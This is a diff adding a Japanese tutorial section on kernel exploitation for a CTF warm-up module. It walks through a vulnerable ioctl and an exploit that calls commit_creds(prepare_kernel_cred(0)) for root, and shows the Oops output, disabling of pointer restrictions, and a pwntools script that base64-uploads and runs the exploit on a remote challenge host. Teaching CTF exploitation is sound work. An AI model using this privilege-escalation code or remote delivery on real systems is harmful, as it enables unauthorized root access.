@@ -695,11 +695,378 @@ $25 = {
 しかし、本LKMでは`open`を登録していないので、何も専用の処理はされません。
 ただしそれでもユーザにエラーなく`fd`は返されます。
 
-さて、ここまで`open`システムコールが`miscdevice`をopenするまでの流れを追ってきました。
-これ以降はこんなに詳しく順を追ったコードリーディングの説明はしませんが、
+さて、ここまで`open`システムコールが`miscdevice`をopenするまでの流れを追うことができました。
+
+## `ioctl`と脆弱性
+
+さて、LKMに話を戻しましょう。
+長くなってしまったのでコードを再掲します:
+
+```c
+static long kwarmup_ioctl(struct file *filp, unsigned int cmd,
+                          unsigned long arg) {
+  long ret = -EINVAL;
+
+  switch (cmd) {
+    case KWARMUP_IOCTL_JMP:
+      void (*fn)(void) = (void *)arg;
+      fn();
+      ret = 0;
+      break;
+    default:
+      break;
+  }
+
+  return ret;
+}
+```
+
+`ioctl`ではファイルに対する諸々の操作をコマンドを指定することで実行できます。
+`ioctl`は、以下の引数を取ります:
+
+- `filp`: `open`で返された`struct file`へのポインタ。userlandからは`file`に紐づく`fd`を渡す。
+- `cmd`: コマンドID。
+- `arg`: 任意のuserlandデータ。便宜上`ulong`になっている。
+
+今回はコマンドはひとつだけ定義されており、そのコマンドでは`arg`として渡された値を関数ポインタと解釈して呼び出しています。
+脆弱というか、意味のわからないコードですが、今回は最初なのでこれで良しとしましょう。
+まとめると、この`ioctl`を呼び出すことで任意の関数を呼び出すことができます。
+
+
+## exploitを書く
+
+kernel challengeにおけるexploitはC言語で書くことが多いです。
+手元に`exploit.c`のようなファイルを用意して、以下のようなコードを書いてみましょう:
+
+```c
+/*********** commands ******************/
+#define DEV_PATH "/dev/kwarmup"
+#define KWARMUP_IOCTL_JMP 0x1337
+
+int main(int argc, char *argv[]) {
+  int fd;
+  puts("[+] Opening device...");
+  if ((fd = open(DEV_PATH, O_RDWR)) < 0) {
+    perror("[-] open");
+    exit(EXIT_FAILURE);
+  }
+
+  printf("[+] Jumping to %p\n", 0xDEADBEEF);
+  ioctl(fd, KWARMUP_IOCTL_JMP, 0xDEADBEEF);
+
+  puts("[ ] END of life...");
+  sleep(999999);
+}
+```
+
+やっていることはシンプルで、`/dev/kwarmup`を`open`して`ioctl`で`0xDEADBEEF`を渡しています。
+`kwarmup_ioctl`の実装によると、これで`0xDEADBEEF`を関数とみなして呼び出すことになるでしょう。
+
+exploitを実行するには、以下の手順を踏みます:
+
+```sh
+gcc exploit.c -o exploit --static
+cp ./exploit $EX # EXはinitramfsを展開したディレクトリ
+cd $EX && find ./ -print0 | cpio --owner root --null -o --format=newc >../rootfs.cpio && cd -
+gzip ./rootfs.cpio
+```
+
+`exploit`を`rootfs.cpio.gz`の中に入れることができたら、再び`run.sh`を用いてkernelを起動します。
+その後、`/exploit`を実行してみましょう:
+
+```sh
+/ $ ./exploit
+[+] Opening device...
+[+] Jumping to 0xdeadbeef
+BUG: unable to handle page fault for address: 00000000deadbeef
+#PF: supervisor instruction fetch in kernel mode
+#PF: error_code(0x0010) - not-present page
+PGD 32b4067 P4D 32b4067 PUD 0
+Oops: 0010 [#1] SMP NOPTI
+CPU: 0 PID: 152 Comm: exploit Tainted: G           O      5.15.0 #2
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+RIP: 0010:0xdeadbeef
+Code: Unable to access opcode bytes at RIP 0xdeadbec5.
+RSP: 0018:ffffc90000463e98 EFLAGS: 00000246
+RAX: ffffffffc0000000 RBX: 0000000000000003 RCX: ffff8880024845a8
+RDX: 00000000deadbeef RSI: 0000000000001337 RDI: ffff888003162300
+RBP: ffffc90000463ea0 R08: 0000000000000003 R09: 0000000000000000
+R10: ffff88800328c5e8 R11: 0000000000000000 R12: ffff888003162300
+R13: 00000000deadbeef R14: ffff888003162300 R15: 0000000000001337
+FS:  00000000004ee3c0(0000) GS:ffff88800f600000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 00000000deadbeef CR3: 0000000003296000 CR4: 00000000000006f0
+Call Trace:
+ ? kwarmup_ioctl+0x11/0x1d [kwarmup]
+ __x64_sys_ioctl+0x3e6/0x910
+ ? handle_edge_irq+0x82/0x220
+ ? exit_to_user_mode_prepare+0x2f/0x140
+ do_syscall_64+0x43/0x90
+ entry_SYSCALL_64_after_hwframe+0x44/0xae
+RIP: 0033:0x455f5f
+Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 44 24 10 b8 10 00 00 00 0f 05 <41> 80
+RSP: 002b:00007ffea69447b0 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
+RAX: ffffffffffffffda RBX: 00007ffea6944a28 RCX: 0000000000455f5f
+RDX: 00000000deadbeef RSI: 0000000000001337 RDI: 0000000000000003
+RBP: 00007ffea6944830 R08: 0000000000000000 R09: 0000000000000000
+R10: 0000000000000010 R11: 0000000000000246 R12: 0000000000000001
+R13: 00007ffea6944a18 R14: 00000000004e1790 R15: 0000000000000001
+Modules linked in: kwarmup(O)
+CR2: 00000000deadbeef
+---[ end trace 8cc92b35e878d37c ]---
+RIP: 0010:0xdeadbeef
+Code: Unable to access opcode bytes at RIP 0xdeadbec5.
+RSP: 0018:ffffc90000463e98 EFLAGS: 00000246
+RAX: ffffffffc0000000 RBX: 0000000000000003 RCX: ffff8880024845a8
+RDX: 00000000deadbeef RSI: 0000000000001337 RDI: ffff888003162300
+RBP: ffffc90000463ea0 R08: 0000000000000003 R09: 0000000000000000
+R10: ffff88800328c5e8 R11: 0000000000000000 R12: ffff888003162300
+R13: 00000000deadbeef R14: ffff888003162300 R15: 0000000000001337
+FS:  00000000004ee3c0(0000) GS:ffff88800f600000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 00000000deadbeef CR3: 0000000003296000 CR4: 00000000000006f0
+Kernel panic - not syncing: Fatal exception
+Kernel Offset: disabled
+Rebooting in 1 seconds..
+```
+
+この出力のことを`Kernel Oops`と言ったりします。
+Oopsではエラーの原因や、その時の各種レジスタの値やbacktrace等が出力されます。
+今回の原因は`unable to handle page fault for address: 00000000deadbeef`です。
+確かに`0xDEADBEEF`に制御を飛ばせたようですね！
+これでRIPが取れたことになります。
+
+{{< alert title="Oopsのコードリーディング" color="info" >}}
+せっかくコードリーディングの仕方を書いたので、
+上記のOopsメッセージがどの関数を辿ってソースコード中のどこで出力されているのかを追ってみてください。
+{{< /alert>}}
+
+## 魔法の言葉 ~ `commit_creds(prepare_kernel_cred(0))` ~
+
+userland exploitにおける目標は、ユーザシェルを取ることでした。
+対して、kernel exploitにおける基本的な目標は、**rootを取る**ことです。
+これを実現する方法は数多ありますが、最も基礎的なものとして`commit_creds(prepare_kernel_cred(0))`を使っていきましょう。
+
+そもそも、rootを取るとはどういうことでしょうか。
+言い換えると、プロセスのUIDはどのようにして定義されているのでしょうか。
+
+Linuxにおいて、各プロセスは`struct task_struct`([/include/linux/sched.h]())という構造体で表現されます。
+この`task_struct`は、`cred`という`struct cred`([/include/linux/cred.h]())型のフィールドを保持します。
+この`cred`がプロセスのUIDを表現する構造体です:
+
+```c
+struct cred {
+  ...
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+	unsigned	securebits;	/* SUID-less security management */
+	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+  struct user_struct *user;	/* real user ID subscription */
+	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+  ...
+}
+```
+
+`commit_creds()`([/kernel/cred.c]())は、`task_struct`に対して新しい`cred`を上書きします:
+
+```c
+int commit_creds(struct cred *new)
+{
+  ...
+	rcu_assign_pointer(task->real_cred, new);
+	rcu_assign_pointer(task->cred, new);
+  ...
+}
+```
+
+つまり、**UIDが0であるような`cred`を`commit_creds()`に渡してやれば現在のプロセスをroot化させることができます**。
+ではUID0の`cred`はどうやって作れるのでしょうか。
+簡単な方法は大きく分けて2つあります:
+
+### 1. `init_cred`を使う
+
+`init_cred`([/kernel/cred.c]())はPID0プロセス用の`task_struct`が保持する`cred`です。
+必然的にUID0を持っています。
+
+```c
+struct cred init_cred = {
+	.usage			= ATOMIC_INIT(4),
+#ifdef CONFIG_DEBUG_CREDENTIALS
+	.subscribers		= ATOMIC_INIT(2),
+	.magic			= CRED_MAGIC,
+#endif
+	.uid			= GLOBAL_ROOT_UID,
+	.gid			= GLOBAL_ROOT_GID,
+	.suid			= GLOBAL_ROOT_UID,
+	.sgid			= GLOBAL_ROOT_GID,
+  ...
+}
+```
+
+しかもこのシンボルはexportされています。
+よって、`commit_creds()`に`&init_cred`を渡してやると、UID0の`cred`で上書きできます。
+
+### 2. `prepare_kernel_cred(0)`を使う
+
+`prepare_kernel_cred(0)`([/kernel/cred.c]())は、引数に渡された`task_struct`をもとに新しい`cred`を作成します。
+処理の詳細は読者におまかせしますが、`NULL`を渡した場合には`init_cred`を使って新しい`cred`を作成することになっています。
+よって、先程の方法と同じく`commit_creds(prepare_kernel_cred(0))`を呼び出すことで、UID0の`cred`を作成して上書きすることができます。
+
+
+## symbolを調べる
+
+さて、ここまでで準備はできました。
+exploit内に以下のような関数を用意しましょう:
+
+```c
+typedef int (*commit_creds_fn)(void *);
+typedef void *(*prepare_kernel_cred_fn)(void *);
+const commit_creds_fn commit_creds = (commit_creds_fn)0x000000000000000;
+const prepare_kernel_cred_fn prepare_kernel_cred =
+    (prepare_kernel_cred_fn)0x0000000000000000;
+
+void get_root(void) { commit_creds(prepare_kernel_cred(0)); }
+```
+
+`get_root()`のアドレスを`ioctl`に渡してジャンプさせればrootを取ることができます。
+しかし、関数を呼ぶためには関数のアドレスを知る必要があります。
+色々と方法はありますが、`/proc/kallsyms`を読んでシンボル情報を取得するのが一番楽です。
+ただし、このprocファイルはroot権限がないと読むことができません(厳密には、rootでないとアドレスがマスクされます)。
+そのため、`initramfs`中の`/etc/init.d/S999p3land`の以下の箇所を修正しておきましょう:
+
+```txt
+## /proc/kallsymsにおけるポインタマスクを取り除く
+#echo 2 > /proc/sys/kernel/kptr_restrict
+echo 0 > /proc/sys/kernel/kptr_restrict
+
+## dmesgにおけるポインタマスクを取り除く
+#echo 1 > /proc/sys/kernel/dmesg_restrict
+echo 0 > /proc/sys/kernel/dmesg_restrict
+
+## rootでシェルを起動
+#setsid cttyhack setuidgid 9999 sh
+setsid cttyhack setuidgid 0 sh
+```
+
+これで`/proc/kallsyms`を読むことができるようになります:
+
+```txt
+/ # cat /proc/kallsyms | grep -e commit_creds -e prepare_kernel_cred
+ffffffff810737b0 T commit_creds
+ffffffff81073960 T prepare_kernel_cred
+```
+
+値をメモしたら、先程のexploitのところに書いておきましょう。
+
+あとはローカルでexploitを動かすだけです。
+先程rootでシェルを起動するように変更した場合には戻しておいてください。
+実際に動かしてみると以下のようになります:
+
+![local exploit](./img/local.png)
+
+rootが取れました！
+
+## Remote Exploit
+
+続いて、実際にリモートでexploitを動かしてみましょう。
+今回のkernel challengeではネットワークを有効にしているため`wget`等でビルドしたexploitをダウンロードさせることも出来るかもしれません。
+しかし、今回は`nc`で確立した接続だけを使ってexploitを送り込むことにします。
+
+まず、exploit自体は軽量なmusl libcを使ってビルドすることが望ましいです。
+以下のような`Dockerfile`で作ったコンテナ上でexploitをビルドしましょう:
+
+```sh
+$ cat ./Dockerfile
+FROM alpine
+RUN apk add gcc musl-dev linux-headers
+
+$ docker build -t p3land-exploit - < ./Dockerfile
+  docker container run \
+    -it \
+    --rm \
+    -v "$PWD:$PWD" \
+    -w "$PWD" \
+    "p3land-exploit" \
+      /bin/sh -c "gcc exploit.c -o exploit --static"
+```
+
+続いて、もっと軽くします。さらに、bashのビルトイン機能だけで送れるようにASCII onlyに変換します:
+
+```sh
+strip ./exploit
+gzip ./exploit
+base64 ./exploit.gz > ./exploit.gz.b64
+```
+
+ここまでで下準備は終了です。
+以下のコマンドを`sender.py`として用意してあげましょう:
+
+```py
+#!/usr/bin/env python
+#encoding: utf-8;
+
+from pwn import *
+import sys,os
+
+exploit_bin = "exploit.gz.b64"
+
+## exploit ###########################################
+
+def exploit():
+  global c
+
+  with open(exploit_bin, 'r') as f:
+    binary = f.read()
+
+  progress = 0
+  N = 0x300
+
+  c.sendlineafter('$', 'cd /tmp')
+
+  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
+  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
+    c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
+    progress += N
+    if progress % N == 0:
+      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(len(binary))))
+  c.sendlineafter('$', 'base64 -d exploit.gz.b64 > exploit.gz')
+  c.sendlineafter('$', 'gunzip ./exploit.gz')
+
+  c.sendlineafter('$', 'chmod +x ./exploit')
+  c.sendlineafter('$', './exploit')
+
+## main ##############################################
+
+if __name__ == "__main__":
+    global c
+    c = remote("sc.skb.pw", 49404)
+    exploit()
+    c.interactive()
+```
+
+このスクリプトは、`exploit.gz.b64`の内容をリモートホスト上でひたすら`echo`し続けてコピーします。
+その後、先程行った圧縮等の逆の処理をしてexploitを復元し、実行します。
+
+```sh
+python3 ./sender.py
+```
+
+![remote exploit](./img/remote.gif)
+
+リモートでrootが取れましたね！
+フラグは`/root/flag`にあるのでぜひ取ってみてください。
+
+-------------------------------------
+
+この章以降はこんなに詳しく順を追ったコードリーディングの説明はしませんが、
 実際にコードを読んで流れを追っていくことはとても勉強になります。
 また、何をしてるかわからないコードを読んで唸るよりも、
 debug symbolつきのvmlinuxをGDBに食べさせてbacktraceを見るなりしたほうがよっぽど効率的ということも分かっていただけたでしょうか。
 ぜひこれからも少しでも気になったこと・分からないことがあれば、このような方法でコードリーディングをしてみてください。
-
-## `ioctl`と脆弱性
